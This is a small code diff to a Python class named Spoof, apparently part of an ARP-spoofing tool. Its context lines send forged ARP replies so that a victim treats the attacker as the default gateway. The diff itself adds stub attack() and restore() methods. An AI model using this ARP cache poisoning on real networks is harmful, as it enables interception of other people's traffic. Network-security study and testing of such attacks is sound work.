@@ -20,3 +20,8 @@ class Spoof:
         send_arp_packet(ARP_REPLY_OPCODE, self.__our_mac, self.__victim_ip, self.__default_gateway_mac, self.__default_gateway_ip)
         # Make the victim think that I'm the default gateway
         send_arp_packet(ARP_REPLY_OPCODE, self.__our_mac, self.__default_gateway_ip, self.__victim_mac, self.__victim_ip)
+
+    def attack(self) -> None:
+        raise NotImplementedError("attack() must be implemented by subclass")
+    def restore(self) -> None:
+        raise NotImplementedError("restore() must be implemented by subclass")
